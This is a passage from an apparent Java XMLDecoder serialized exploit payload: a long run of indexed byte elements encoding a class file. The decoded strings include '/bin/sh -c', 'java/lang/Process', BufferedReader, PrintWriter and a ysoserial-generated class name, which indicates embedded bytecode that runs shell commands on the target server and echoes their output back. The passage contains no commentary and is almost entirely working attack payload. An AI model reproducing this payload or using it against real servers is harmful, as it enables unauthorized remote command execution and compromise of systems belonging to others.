index=\"2810\"><byte>106</byte></void><void index=\"2811\"><byte>97</byte></void><void index=\"2812\"><byte>118</byte></void><void index=\"2813\"><byte>97</byte></void><void index=\"2814\"><byte>47</byte></void><void index=\"2815\"><byte>108</byte></void><void index=\"2816\"><byte>97</byte></void><void index=\"2817\"><byte>110</byte></void><void index=\"2818\"><byte>103</byte></void><void index=\"2819\"><byte>47</byte></void><void index=\"2820\"><byte>80</byte></void><void index=\"2821\"><byte>114</byte></void><void index=\"2822\"><byte>111</byte></void><void index=\"2823\"><byte>99</byte></void><void index=\"2824\"><byte>101</byte></void><void index=\"2825\"><byte>115</byte></void><void index=\"2826\"><byte>115</byte></void><void index=\"2827\"><byte>59</byte></void><void index=\"2828\"><byte>12</byte></void><void index=\"2829\"><byte>0</byte></void><void index=\"2830\"><byte>-126</byte></void><void index=\"2831\"><byte>0</byte></void><void index=\"2832\"><byte>-125</byte></void><void index=\"2833\"><byte>10</byte></void><void index=\"2834\"><byte>0</byte></void><void index=\"2835\"><byte>123</byte></void><void index=\"2836\"><byte>0</byte></void><void index=\"2837\"><byte>-124</byte></void><void index=\"2838\"><byte>1</byte></void><void index=\"2839\"><byte>0</byte></void><void index=\"2840\"><byte>11</byte></void><void index=\"2841\"><byte>47</byte></void><void index=\"2842\"><byte>98</byte></void><void index=\"2843\"><byte>105</byte></void><void index=\"2844\"><byte>110</byte></void><void index=\"2845\"><byte>47</byte></void><void index=\"2846\"><byte>115</byte></void><void index=\"2847\"><byte>104</byte></void><void index=\"2848\"><byte>32</byte></void><void index=\"2849\"><byte>45</byte></void><void index=\"2850\"><byte>99</byte></void><void index=\"2851\"><byte>32</byte></void><void index=\"2852\"><byte>8</byte></void><void index=\"2853\"><byte>0</byte></void><void index=\"2854\"><byte>-122</byte></void><void index=\"2855\"><byte>1</byte></void><void index=\"2856\"><byte>0</byte></void><void index=\"2857\"><byte>22</byte></void><void index=\"2858\"><byte>106</byte></void><void index=\"2859\"><byte>97</byte></void><void index=\"2860\"><byte>118</byte></void><void index=\"2861\"><byte>97</byte></void><void index=\"2862\"><byte>47</byte></void><void index=\"2863\"><byte>105</byte></void><void index=\"2864\"><byte>111</byte></void><void index=\"2865\"><byte>47</byte></void><void index=\"2866\"><byte>66</byte></void><void index=\"2867\"><byte>117</byte></void><void index=\"2868\"><byte>102</byte></void><void index=\"2869\"><byte>102</byte></void><void index=\"2870\"><byte>101</byte></void><void index=\"2871\"><byte>114</byte></void><void index=\"2872\"><byte>101</byte></void><void index=\"2873\"><byte>100</byte></void><void index=\"2874\"><byte>82</byte></void><void index=\"2875\"><byte>101</byte></void><void index=\"2876\"><byte>97</byte></void><void index=\"2877\"><byte>100</byte></void><void index=\"2878\"><byte>101</byte></void><void index=\"2879\"><byte>114</byte></void><void index=\"2880\"><byte>7</byte></void><void index=\"2881\"><byte>0</byte></void><void index=\"2882\"><byte>-120</byte></void><void index=\"2883\"><byte>1</byte></void><void index=\"2884\"><byte>0</byte></void><void index=\"2885\"><byte>25</byte></void><void index=\"2886\"><byte>106</byte></void><void index=\"2887\"><byte>97</byte></void><void index=\"2888\"><byte>118</byte></void><void index=\"2889\"><byte>97</byte></void><void index=\"2890\"><byte>47</byte></void><void index=\"2891\"><byte>105</byte></void><void index=\"2892\"><byte>111</byte></void><void index=\"2893\"><byte>47</byte></void><void index=\"2894\"><byte>73</byte></void><void index=\"2895\"><byte>110</byte></void><void index=\"2896\"><byte>112</byte></void><void index=\"2897\"><byte>117</byte></void><void index=\"2898\"><byte>116</byte></void><void index=\"2899\"><byte>83</byte></void><void index=\"2900\"><byte>116</byte></void><void index=\"2901\"><byte>114</byte></void><void index=\"2902\"><byte>101</byte></void><void index=\"2903\"><byte>97</byte></void><void index=\"2904\"><byte>109</byte></void><void index=\"2905\"><byte>82</byte></void><void index=\"2906\"><byte>101</byte></void><void index=\"2907\"><byte>97</byte></void><void index=\"2908\"><byte>100</byte></void><void index=\"2909\"><byte>101</byte></void><void index=\"2910\"><byte>114</byte></void><void index=\"2911\"><byte>7</byte></void><void index=\"2912\"><byte>0</byte></void><void index=\"2913\"><byte>-118</byte></void><void index=\"2914\"><byte>1</byte></void><void index=\"2915\"><byte>0</byte></void><void index=\"2916\"><byte>17</byte></void><void index=\"2917\"><byte>106</byte></void><void index=\"2918\"><byte>97</byte></void><void index=\"2919\"><byte>118</byte></void><void index=\"2920\"><byte>97</byte></void><void index=\"2921\"><byte>47</byte></void><void index=\"2922\"><byte>108</byte></void><void index=\"2923\"><byte>97</byte></void><void index=\"2924\"><byte>110</byte></void><void index=\"2925\"><byte>103</byte></void><void index=\"2926\"><byte>47</byte></void><void index=\"2927\"><byte>80</byte></void><void index=\"2928\"><byte>114</byte></void><void index=\"2929\"><byte>111</byte></void><void index=\"2930\"><byte>99</byte></void><void index=\"2931\"><byte>101</byte></void><void index=\"2932\"><byte>115</byte></void><void index=\"2933\"><byte>115</byte></void><void index=\"2934\"><byte>7</byte></void><void index=\"2935\"><byte>0</byte></void><void index=\"2936\"><byte>-116</byte></void><void index=\"2937\"><byte>1</byte></void><void index=\"2938\"><byte>0</byte></void><void index=\"2939\"><byte>14</byte></void><void index=\"2940\"><byte>103</byte></void><void index=\"2941\"><byte>101</byte></void><void index=\"2942\"><byte>116</byte></void><void index=\"2943\"><byte>73</byte></void><void index=\"2944\"><byte>110</byte></void><void index=\"2945\"><byte>112</byte></void><void index=\"2946\"><byte>117</byte></void><void index=\"2947\"><byte>116</byte></void><void index=\"2948\"><byte>83</byte></void><void index=\"2949\"><byte>116</byte></void><void index=\"2950\"><byte>114</byte></void><void index=\"2951\"><byte>101</byte></void><void index=\"2952\"><byte>97</byte></void><void index=\"2953\"><byte>109</byte></void><void index=\"2954\"><byte>1</byte></void><void index=\"2955\"><byte>0</byte></void><void index=\"2956\"><byte>23</byte></void><void index=\"2957\"><byte>40</byte></void><void index=\"2958\"><byte>41</byte></void><void index=\"2959\"><byte>76</byte></void><void index=\"2960\"><byte>106</byte></void><void index=\"2961\"><byte>97</byte></void><void index=\"2962\"><byte>118</byte></void><void index=\"2963\"><byte>97</byte></void><void index=\"2964\"><byte>47</byte></void><void index=\"2965\"><byte>105</byte></void><void index=\"2966\"><byte>111</byte></void><void index=\"2967\"><byte>47</byte></void><void index=\"2968\"><byte>73</byte></void><void index=\"2969\"><byte>110</byte></void><void index=\"2970\"><byte>112</byte></void><void index=\"2971\"><byte>117</byte></void><void index=\"2972\"><byte>116</byte></void><void index=\"2973\"><byte>83</byte></void><void index=\"2974\"><byte>116</byte></void><void index=\"2975\"><byte>114</byte></void><void index=\"2976\"><byte>101</byte></void><void index=\"2977\"><byte>97</byte></void><void index=\"2978\"><byte>109</byte></void><void index=\"2979\"><byte>59</byte></void><void index=\"2980\"><byte>12</byte></void><void index=\"2981\"><byte>0</byte></void><void index=\"2982\"><byte>-114</byte></void><void index=\"2983\"><byte>0</byte></void><void index=\"2984\"><byte>-113</byte></void><void index=\"2985\"><byte>10</byte></void><void index=\"2986\"><byte>0</byte></void><void index=\"2987\"><byte>-115</byte></void><void index=\"2988\"><byte>0</byte></void><void index=\"2989\"><byte>-112</byte></void><void index=\"2990\"><byte>1</byte></void><void index=\"2991\"><byte>0</byte></void><void index=\"2992\"><byte>42</byte></void><void index=\"2993\"><byte>40</byte></void><void index=\"2994\"><byte>76</byte></void><void index=\"2995\"><byte>106</byte></void><void index=\"2996\"><byte>97</byte></void><void index=\"2997\"><byte>118</byte></void><void index=\"2998\"><byte>97</byte></void><void index=\"2999\"><byte>47</byte></void><void index=\"3000\"><byte>105</byte></void><void index=\"3001\"><byte>111</byte></void><void index=\"3002\"><byte>47</byte></void><void index=\"3003\"><byte>73</byte></void><void index=\"3004\"><byte>110</byte></void><void index=\"3005\"><byte>112</byte></void><void index=\"3006\"><byte>117</byte></void><void index=\"3007\"><byte>116</byte></void><void index=\"3008\"><byte>83</byte></void><void index=\"3009\"><byte>116</byte></void><void index=\"3010\"><byte>114</byte></void><void index=\"3011\"><byte>101</byte></void><void index=\"3012\"><byte>97</byte></void><void index=\"3013\"><byte>109</byte></void><void index=\"3014\"><byte>59</byte></void><void index=\"3015\"><byte>76</byte></void><void index=\"3016\"><byte>106</byte></void><void index=\"3017\"><byte>97</byte></void><void index=\"3018\"><byte>118</byte></void><void index=\"3019\"><byte>97</byte></void><void index=\"3020\"><byte>47</byte></void><void index=\"3021\"><byte>108</byte></void><void index=\"3022\"><byte>97</byte></void><void index=\"3023\"><byte>110</byte></void><void index=\"3024\"><byte>103</byte></void><void index=\"3025\"><byte>47</byte></void><void index=\"3026\"><byte>83</byte></void><void index=\"3027\"><byte>116</byte></void><void index=\"3028\"><byte>114</byte></void><void index=\"3029\"><byte>105</byte></void><void index=\"3030\"><byte>110</byte></void><void index=\"3031\"><byte>103</byte></void><void index=\"3032\"><byte>59</byte></void><void index=\"3033\"><byte>41</byte></void><void index=\"3034\"><byte>86</byte></void><void index=\"3035\"><byte>12</byte></void><void index=\"3036\"><byte>0</byte></void><void index=\"3037\"><byte>10</byte></void><void index=\"3038\"><byte>0</byte></void><void index=\"3039\"><byte>-110</byte></void><void index=\"3040\"><byte>10</byte></void><void index=\"3041\"><byte>0</byte></void><void index=\"3042\"><byte>-117</byte></void><void index=\"3043\"><byte>0</byte></void><void index=\"3044\"><byte>-109</byte></void><void index=\"3045\"><byte>1</byte></void><void index=\"3046\"><byte>0</byte></void><void index=\"3047\"><byte>19</byte></void><void index=\"3048\"><byte>40</byte></void><void index=\"3049\"><byte>76</byte></void><void index=\"3050\"><byte>106</byte></void><void index=\"3051\"><byte>97</byte></void><void index=\"3052\"><byte>118</byte></void><void index=\"3053\"><byte>97</byte></void><void index=\"3054\"><byte>47</byte></void><void index=\"3055\"><byte>105</byte></void><void index=\"3056\"><byte>111</byte></void><void index=\"3057\"><byte>47</byte></void><void index=\"3058\"><byte>82</byte></void><void index=\"3059\"><byte>101</byte></void><void index=\"3060\"><byte>97</byte></void><void index=\"3061\"><byte>100</byte></void><void index=\"3062\"><byte>101</byte></void><void index=\"3063\"><byte>114</byte></void><void index=\"3064\"><byte>59</byte></void><void index=\"3065\"><byte>41</byte></void><void index=\"3066\"><byte>86</byte></void><void index=\"3067\"><byte>12</byte></void><void index=\"3068\"><byte>0</byte></void><void index=\"3069\"><byte>10</byte></void><void index=\"3070\"><byte>0</byte></void><void index=\"3071\"><byte>-107</byte></void><void index=\"3072\"><byte>10</byte></void><void index=\"3073\"><byte>0</byte></void><void index=\"3074\"><byte>-119</byte></void><void index=\"3075\"><byte>0</byte></void><void index=\"3076\"><byte>-106</byte></void><void index=\"3077\"><byte>1</byte></void><void index=\"3078\"><byte>0</byte></void><void index=\"3079\"><byte>0</byte></void><void index=\"3080\"><byte>8</byte></void><void index=\"3081\"><byte>0</byte></void><void index=\"3082\"><byte>-104</byte></void><void index=\"3083\"><byte>1</byte></void><void index=\"3084\"><byte>0</byte></void><void index=\"3085\"><byte>8</byte></void><void index=\"3086\"><byte>114</byte></void><void index=\"3087\"><byte>101</byte></void><void index=\"3088\"><byte>97</byte></void><void index=\"3089\"><byte>100</byte></void><void index=\"3090\"><byte>76</byte></void><void index=\"3091\"><byte>105</byte></void><void index=\"3092\"><byte>110</byte></void><void index=\"3093\"><byte>101</byte></void><void index=\"3094\"><byte>12</byte></void><void index=\"3095\"><byte>0</byte></void><void index=\"3096\"><byte>-102</byte></void><void index=\"3097\"><byte>0</byte></void><void index=\"3098\"><byte>90</byte></void><void index=\"3099\"><byte>10</byte></void><void index=\"3100\"><byte>0</byte></void><void index=\"3101\"><byte>-119</byte></void><void index=\"3102\"><byte>0</byte></void><void index=\"3103\"><byte>-101</byte></void><void index=\"3104\"><byte>1</byte></void><void index=\"3105\"><byte>0</byte></void><void index=\"3106\"><byte>9</byte></void><void index=\"3107\"><byte>103</byte></void><void index=\"3108\"><byte>101</byte></void><void index=\"3109\"><byte>116</byte></void><void index=\"3110\"><byte>87</byte></void><void index=\"3111\"><byte>114</byte></void><void index=\"3112\"><byte>105</byte></void><void index=\"3113\"><byte>116</byte></void><void index=\"3114\"><byte>101</byte></void><void index=\"3115\"><byte>114</byte></void><void index=\"3116\"><byte>1</byte></void><void index=\"3117\"><byte>0</byte></void><void index=\"3118\"><byte>23</byte></void><void index=\"3119\"><byte>40</byte></void><void index=\"3120\"><byte>41</byte></void><void index=\"3121\"><byte>76</byte></void><void index=\"3122\"><byte>106</byte></void><void index=\"3123\"><byte>97</byte></void><void index=\"3124\"><byte>118</byte></void><void index=\"3125\"><byte>97</byte></void><void index=\"3126\"><byte>47</byte></void><void index=\"3127\"><byte>105</byte></void><void index=\"3128\"><byte>111</byte></void><void index=\"3129\"><byte>47</byte></void><void index=\"3130\"><byte>80</byte></void><void index=\"3131\"><byte>114</byte></void><void index=\"3132\"><byte>105</byte></void><void index=\"3133\"><byte>110</byte></void><void index=\"3134\"><byte>116</byte></void><void index=\"3135\"><byte>87</byte></void><void index=\"3136\"><byte>114</byte></void><void index=\"3137\"><byte>105</byte></void><void index=\"3138\"><byte>116</byte></void><void index=\"3139\"><byte>101</byte></void><void index=\"3140\"><byte>114</byte></void><void index=\"3141\"><byte>59</byte></void><void index=\"3142\"><byte>12</byte></void><void index=\"3143\"><byte>0</byte></void><void index=\"3144\"><byte>-99</byte></void><void index=\"3145\"><byte>0</byte></void><void index=\"3146\"><byte>-98</byte></void><void index=\"3147\"><byte>10</byte></void><void index=\"3148\"><byte>0</byte></void><void index=\"3149\"><byte>69</byte></void><void index=\"3150\"><byte>0</byte></void><void index=\"3151\"><byte>-97</byte></void><void index=\"3152\"><byte>1</byte></void><void index=\"3153\"><byte>0</byte></void><void index=\"3154\"><byte>19</byte></void><void index=\"3155\"><byte>106</byte></void><void index=\"3156\"><byte>97</byte></void><void index=\"3157\"><byte>118</byte></void><void index=\"3158\"><byte>97</byte></void><void index=\"3159\"><byte>47</byte></void><void index=\"3160\"><byte>105</byte></void><void index=\"3161\"><byte>111</byte></void><void index=\"3162\"><byte>47</byte></void><void index=\"3163\"><byte>80</byte></void><void index=\"3164\"><byte>114</byte></void><void index=\"3165\"><byte>105</byte></void><void index=\"3166\"><byte>110</byte></void><void index=\"3167\"><byte>116</byte></void><void index=\"3168\"><byte>87</byte></void><void index=\"3169\"><byte>114</byte></void><void index=\"3170\"><byte>105</byte></void><void index=\"3171\"><byte>116</byte></void><void index=\"3172\"><byte>101</byte></void><void index=\"3173\"><byte>114</byte></void><void index=\"3174\"><byte>7</byte></void><void index=\"3175\"><byte>0</byte></void><void index=\"3176\"><byte>-95</byte></void><void index=\"3177\"><byte>1</byte></void><void index=\"3178\"><byte>0</byte></void><void index=\"3179\"><byte>5</byte></void><void index=\"3180\"><byte>119</byte></void><void index=\"3181\"><byte>114</byte></void><void index=\"3182\"><byte>105</byte></void><void index=\"3183\"><byte>116</byte></void><void index=\"3184\"><byte>101</byte></void><void index=\"3185\"><byte>12</byte></void><void index=\"3186\"><byte>0</byte></void><void index=\"3187\"><byte>-93</byte></void><void index=\"3188\"><byte>0</byte></void><void index=\"3189\"><byte>71</byte></void><void index=\"3190\"><byte>10</byte></void><void index=\"3191\"><byte>0</byte></void><void index=\"3192\"><byte>-94</byte></void><void index=\"3193\"><byte>0</byte></void><void index=\"3194\"><byte>-92</byte></void><void index=\"3195\"><byte>1</byte></void><void index=\"3196\"><byte>0</byte></void><void index=\"3197\"><byte>19</byte></void><void index=\"3198\"><byte>106</byte></void><void index=\"3199\"><byte>97</byte></void><void index=\"3200\"><byte>118</byte></void><void index=\"3201\"><byte>97</byte></void><void index=\"3202\"><byte>47</byte></void><void index=\"3203\"><byte>108</byte></void><void index=\"3204\"><byte>97</byte></void><void index=\"3205\"><byte>110</byte></void><void index=\"3206\"><byte>103</byte></void><void index=\"3207\"><byte>47</byte></void><void index=\"3208\"><byte>69</byte></void><void index=\"3209\"><byte>120</byte></void><void index=\"3210\"><byte>99</byte></void><void index=\"3211\"><byte>101</byte></void><void index=\"3212\"><byte>112</byte></void><void index=\"3213\"><byte>116</byte></void><void index=\"3214\"><byte>105</byte></void><void index=\"3215\"><byte>111</byte></void><void index=\"3216\"><byte>110</byte></void><void index=\"3217\"><byte>7</byte></void><void index=\"3218\"><byte>0</byte></void><void index=\"3219\"><byte>-90</byte></void><void index=\"3220\"><byte>1</byte></void><void index=\"3221\"><byte>0</byte></void><void index=\"3222\"><byte>3</byte></void><void index=\"3223\"><byte>111</byte></void><void index=\"3224\"><byte>117</byte></void><void index=\"3225\"><byte>116</byte></void><void index=\"3226\"><byte>1</byte></void><void index=\"3227\"><byte>0</byte></void><void index=\"3228\"><byte>21</byte></void><void index=\"3229\"><byte>76</byte></void><void index=\"3230\"><byte>106</byte></void><void index=\"3231\"><byte>97</byte></void><void index=\"3232\"><byte>118</byte></void><void index=\"3233\"><byte>97</byte></void><void index=\"3234\"><byte>47</byte></void><void index=\"3235\"><byte>105</byte></void><void index=\"3236\"><byte>111</byte></void><void index=\"3237\"><byte>47</byte></void><void index=\"3238\"><byte>80</byte></void><void index=\"3239\"><byte>114</byte></void><void index=\"3240\"><byte>105</byte></void><void index=\"3241\"><byte>110</byte></void><void index=\"3242\"><byte>116</byte></void><void index=\"3243\"><byte>83</byte></void><void index=\"3244\"><byte>116</byte></void><void index=\"3245\"><byte>114</byte></void><void index=\"3246\"><byte>101</byte></void><void index=\"3247\"><byte>97</byte></void><void index=\"3248\"><byte>109</byte></void><void index=\"3249\"><byte>59</byte></void><void index=\"3250\"><byte>12</byte></void><void index=\"3251\"><byte>0</byte></void><void index=\"3252\"><byte>-88</byte></void><void index=\"3253\"><byte>0</byte></void><void index=\"3254\"><byte>-87</byte></void><void index=\"3255\"><byte>9</byte></void><void index=\"3256\"><byte>0</byte></void><void index=\"3257\"><byte>107</byte></void><void index=\"3258\"><byte>0</byte></void><void index=\"3259\"><byte>-86</byte></void><void index=\"3260\"><byte>1</byte></void><void index=\"3261\"><byte>0</byte></void><void index=\"3262\"><byte>19</byte></void><void index=\"3263\"><byte>106</byte></void><void index=\"3264\"><byte>97</byte></void><void index=\"3265\"><byte>118</byte></void><void index=\"3266\"><byte>97</byte></void><void index=\"3267\"><byte>47</byte></void><void index=\"3268\"><byte>108</byte></void><void index=\"3269\"><byte>97</byte></void><void index=\"3270\"><byte>110</byte></void><void index=\"3271\"><byte>103</byte></void><void index=\"3272\"><byte>47</byte></void><void index=\"3273\"><byte>84</byte></void><void index=\"3274\"><byte>104</byte></void><void index=\"3275\"><byte>114</byte></void><void index=\"3276\"><byte>111</byte></void><void index=\"3277\"><byte>119</byte></void><void index=\"3278\"><byte>97</byte></void><void index=\"3279\"><byte>98</byte></void><void index=\"3280\"><byte>108</byte></void><void index=\"3281\"><byte>101</byte></void><void index=\"3282\"><byte>7</byte></void><void index=\"3283\"><byte>0</byte></void><void index=\"3284\"><byte>-84</byte></void><void index=\"3285\"><byte>10</byte></void><void index=\"3286\"><byte>0</byte></void><void index=\"3287\"><byte>-83</byte></void><void index=\"3288\"><byte>0</byte></void><void index=\"3289\"><byte>91</byte></void><void index=\"3290\"><byte>1</byte></void><void index=\"3291\"><byte>0</byte></void><void index=\"3292\"><byte>19</byte></void><void index=\"3293\"><byte>106</byte></void><void index=\"3294\"><byte>97</byte></void><void index=\"3295\"><byte>118</byte></void><void index=\"3296\"><byte>97</byte></void><void index=\"3297\"><byte>47</byte></void><void index=\"3298\"><byte>105</byte></void><void index=\"3299\"><byte>111</byte></void><void index=\"3300\"><byte>47</byte></void><void index=\"3301\"><byte>80</byte></void><void index=\"3302\"><byte>114</byte></void><void index=\"3303\"><byte>105</byte></void><void index=\"3304\"><byte>110</byte></void><void index=\"3305\"><byte>116</byte></void><void index=\"3306\"><byte>83</byte></void><void index=\"3307\"><byte>116</byte></void><void index=\"3308\"><byte>114</byte></void><void index=\"3309\"><byte>101</byte></void><void index=\"3310\"><byte>97</byte></void><void index=\"3311\"><byte>109</byte></void><void index=\"3312\"><byte>7</byte></void><void index=\"3313\"><byte>0</byte></void><void index=\"3314\"><byte>-81</byte></void><void index=\"3315\"><byte>1</byte></void><void index=\"3316\"><byte>0</byte></void><void index=\"3317\"><byte>7</byte></void><void index=\"3318\"><byte>112</byte></void><void index=\"3319\"><byte>114</byte></void><void index=\"3320\"><byte>105</byte></void><void index=\"3321\"><byte>110</byte></void><void index=\"3322\"><byte>116</byte></void><void index=\"3323\"><byte>108</byte></void><void index=\"3324\"><byte>110</byte></void><void index=\"3325\"><byte>12</byte></void><void index=\"3326\"><byte>0</byte></void><void index=\"3327\"><byte>-79</byte></void><void index=\"3328\"><byte>0</byte></void><void index=\"3329\"><byte>71</byte></void><void index=\"3330\"><byte>10</byte></void><void index=\"3331\"><byte>0</byte></void><void index=\"3332\"><byte>-80</byte></void><void index=\"3333\"><byte>0</byte></void><void index=\"3334\"><byte>-78</byte></void><void index=\"3335\"><byte>1</byte></void><void index=\"3336\"><byte>0</byte></void><void index=\"3337\"><byte>15</byte></void><void index=\"3338\"><byte>112</byte></void><void index=\"3339\"><byte>114</byte></void><void index=\"3340\"><byte>105</byte></void><void index=\"3341\"><byte>110</byte></void><void index=\"3342\"><byte>116</byte></void><void index=\"3343\"><byte>83</byte></void><void index=\"3344\"><byte>116</byte></void><void index=\"3345\"><byte>97</byte></void><void index=\"3346\"><byte>99</byte></void><void index=\"3347\"><byte>107</byte></void><void index=\"3348\"><byte>84</byte></void><void index=\"3349\"><byte>114</byte></void><void index=\"3350\"><byte>97</byte></void><void index=\"3351\"><byte>99</byte></void><void index=\"3352\"><byte>101</byte></void><void index=\"3353\"><byte>12</byte></void><void index=\"3354\"><byte>0</byte></void><void index=\"3355\"><byte>-76</byte></void><void index=\"3356\"><byte>0</byte></void><void index=\"3357\"><byte>11</byte></void><void index=\"3358\"><byte>10</byte></void><void index=\"3359\"><byte>0</byte></void><void index=\"3360\"><byte>-83</byte></void><void index=\"3361\"><byte>0</byte></void><void index=\"3362\"><byte>-75</byte></void><void index=\"3363\"><byte>1</byte></void><void index=\"3364\"><byte>0</byte></void><void index=\"3365\"><byte>13</byte></void><void index=\"3366\"><byte>83</byte></void><void index=\"3367\"><byte>116</byte></void><void index=\"3368\"><byte>97</byte></void><void index=\"3369\"><byte>99</byte></void><void index=\"3370\"><byte>107</byte></void><void index=\"3371\"><byte>77</byte></void><void index=\"3372\"><byte>97</byte></void><void index=\"3373\"><byte>112</byte></void><void index=\"3374\"><byte>84</byte></void><void index=\"3375\"><byte>97</byte></void><void index=\"3376\"><byte>98</byte></void><void index=\"3377\"><byte>108</byte></void><void index=\"3378\"><byte>101</byte></void><void index=\"3379\"><byte>1</byte></void><void index=\"3380\"><byte>0</byte></void><void index=\"3381\"><byte>29</byte></void><void index=\"3382\"><byte>121</byte></void><void index=\"3383\"><byte>115</byte></void><void index=\"3384\"><byte>111</byte></void><void index=\"3385\"><byte>115</byte></void><void index=\"3386\"><byte>101</byte></void><void index=\"3387\"><byte>114</byte></void><void index=\"3388\"><byte>105</byte></void><void index=\"3389\"><byte>97</byte></void><void index=\"3390\"><byte>108</byte></void><void index=\"3391\"><byte>47</byte></void><void index=\"3392\"><byte>80</byte></void><void index=\"3393\"><byte>119</byte></void><void index=\"3394\"><byte>110</byte></void><void index=\"3395\"><byte>101</byte></void><void index=\"3396\"><byte>114</byte></void><void index=\"3397\"><byte>52</byte></void><void index=\"3398\"><byte>53</byte></void><void index=\"3399\"><byte>52</byte></void><void index=\"3400\"><byte>51</byte></void><void index=\"3401\"><byte>56</byte></void><void index=\"3402\"><byte>51</byte></void><void index=\"3403\"><byte>49</byte></void><void index=\"3404\"><byte>52</byte></void><void index=\"3405\"><byte>50</byte></void><void index=\"3406\"><byte>55</byte></void><void index=\"3407\"><byte>56</byte></void><void index=\"3408\"><byte>57</byte></void><void index=\"3409\"><byte>57</byte></void><void index=\"3410\"><byte>50</byte></void><void index=\"3411\"><byte>1</byte></void><void index=\"3412\"><byte>0</byte></void><void index=\"3413\"><byte>31</byte></void><void index=\"3414\"><byte>76</byte></void><void index=\"3415\"><byte>121</byte></void><void index=\"3416\"><byte>115</byte></void><void index=\"3417\"><byte>111</byte></void><void index=\"3418\"><byte>115</byte></void><void index=\"3419\"><byte>101</byte></void><void index=\"3420\"><byte>114</byte></void><void index=\"3421\"><byte>105</byte></void><void index=\"3422\"><byte>97</byte></void><void index=\"3423\"><byte>108</byte></void><void index=\"3424\"><byte>47</byte></void><void index=\"3425\"><byte>80</byte></void><void index=\"3426\"><byte>119</byte></void><void index=\"3427\"><byte>110</byte></void><void index=\"3428\"><byte>101</byte></void><void index=\"3429\"><byte>114</byte></void><void index=\"3430\"><byte>52</byte></void><void index=\"3431\"><byte>53</byte></void><void index=\"3432\"><byte>52</byte></void><void index=\"3433\"><byte>51</byte></void><void index=\"3434\"><byte>56</byte></void><void index=\"3435\"><byte>51</byte></void><void index=\"3436\"><byte>49</byte></void><void index=\"3437\"><byte>52</byte></void><void index=\"3438\"><byte>50</byte></void><void index=\"3439\"><byte>55</byte></void><void index=\"3440\"><byte>56</byte></void><void index=\"3441\"><byte>57</byte></void><void index=\"3442\"><byte>57</byte></void><void index=\"3443\"><byte>50</byte></void><void index=\"3444\"><byte>59</byte></void><void index=\"3445\"><byte>0</byte></void><void index=\"3446\"><byte>33</byte></void><void index=\"3447\"><byte>0</byte></void><void index=\"3448\"><byte>2</byte></void><void index=\"3449\"><byte>0</byte></void><void index=\"3450\"><byte>3</byte></void><void index=\"3451\"><byte>0</byte></void><void index=\"3452\"><byte>1</byte></void><void index=\"3453\"><byte>0</byte></void><void index=\"3454\"><byte>4</byte></void><void index=\"3455\"><byte>0</byte></void><void index=\"3456\"><byte>1</byte></void><void index=\"3457\"><byte>0</byte></void><void index=\"3458\"><byte>26</byte></void><void index=\"3459\"><byte>0</byte></void><void index=\"3460\"><byte>5</byte></void><void index=\"3461\"><byte>0</byte></void><void index=\"3462\"><byte>6</byte></void><void index=\"3463\"><byte>0</byte></void><void index=\"3464\"><byte>1</byte></void><void index=\"3465\"><byte>0</byte></void><void index=\"3466\"><byte>7</byte></void><void index=\"3467\"><byte>0</byte></void><void index=\"3468\"><byte>0</byte></void><void index=\"3469\"><byte>0</byte></void><void index=\"3470\"><byte>2</byte></void><void index=\"3471\"><byte>0</byte></void><void index=\"3472\"><byte>8</byte></void><void index=\"3473\"><byte>0</byte></void><void index=\"3474\"><byte>4</byte></void><void index=\"3475\"><byte>0</byte></void><void index=\"3476\"><byte>1</byte></void><void index=\"3477\"><byte>0</byte></void><void index=\"3478\"><byte>10</byte></void><void index=\"3479\"><byte>0</byte></void><void index=\"3480\"><byte>11</byte></void><void index=\"3481\"><byte>0</byte></void><void index=\"3482\"><byte>1</byte></void><void index=\"3483\"><byte>0</byte></void><void index=\"3484\"><byte>12</byte></void><void index=\"3485\"><byte>0</byte></void><void index=\"3486\"><byte>0</byte></void><void index=\"3487\"><byte>0</byte></void><void index=\"3488\"><byte>47</byte></void><void index=\"3489\"><byte>0</byte></void><void index=\"3490\"><byte>1</byte></void><void index=\"3491\"><byte>0</byte></void><void index=\"3492\"><byte>1</byte></void><void index=\"3493\"><byte>0</byte></void><void index=\"3494\"><byte>0</byte></void><void index=\"3495\"><byte>0</byte></void><void index=\"3496\"><byte>5</byte></void><void index=\"3497\"><byte>42</byte></void><void index=\"3498\"><byte>-73</byte></void><void index=\"3499\"><byte>0</byte></void><void index=\"3500\"><byte>1</byte></void><void index=\"3501\"><byte>-79</byte></void><void index=\"3502\"><byte>0</byte></void><void index=\"3503\"><byte>0</byte></void><void index=\"3504\"><byte>0</byte></void><void index=\"3505\"><byte>2</byte></void><void index=\"3506\"><byte>0</byte></void><void index=\"3507\"><byte>13</byte></void><void index=\"3508\"><byte>0</byte></void><void index=\"3509\"><byte>0</byte></void><void index=\"3510\"><byte>0</byte></void><void index=\"3511\"><byte>6</byte></void><void index=\"3512\"><byte>0</byte></void><void index=\"3513\"><byte>1</byte></void><void index=\"3514\"><byte>0</byte></void><void index=\"3515\"><byte>0</byte></void><void index=\"3516\"><byte>0</byte></void><void index=\"3517\"><byte>47</byte></void><void index=\"3518\"><byte>0</byte></void><void index=\"3519\"><byte>14</byte></void><void index=\"3520\"><byte>0</byte></void><void index=\"3521\"><byte>0</byte></void><void index=\"3522\"><byte>0</byte></void><void index=\"3523\"><byte>12</byte></void><void index=\"3524\"><byte>0</byte></void><void index=\"3525\"><byte>1</byte></void><void index=\"3526\"><byte>0</byte></void><void index=\"3527\"><byte>0</byte></void><void index=\"3528\"><byte>0</byte></void><void index=\"3529\"><byte>5</byte></void><void index=\"3530\"><byte>0</byte></void><void index=\"3531\"><byte>15</byte></void><void index=\"3532\"><byte>0</byte></void><void index=\"3533\"><byte>-71</byte></void><void index=\"3534\"><byte>0</byte></void><void index=\"3535\"><byte>0</byte></void><void index=\"3536\"><byte>0</byte></void><void index=\"3537\"><byte>1</byte></void><void index=\"3538\"><byte>0</byte></void><void index=\"3539\"><byte>19</byte></void><void index=\"3540\"><byte>0</byte></void><void index=\"3541\"><byte>20</byte></void><void index=\"3542\"><byte>0</byte></void><void index=\"3543\"><byte>2</byte></void><void index=\"3544\"><byte>0</byte></void><void index=\"3545\"><byte>12</byte></void><void index=\"3546\"><byte>0</byte></void><void index=\"3547\"><byte>0</byte></void><void index=\"3548\"><byte>0</byte></void><void index=\"3549\"><byte>63</byte></void><void index=\"3550\"><byte>0</byte></void><void index=\"3551\"><byte>0</byte></void><void index=\"3552\"><byte>0</byte></void><void index=\"3553\"><byte>3</byte></void><void index=\"3554\"><byte>0</byte></void><void index=\"3555\"><byte>0</byte></void><void index=\"3556\"><byte>0</byte></void><void 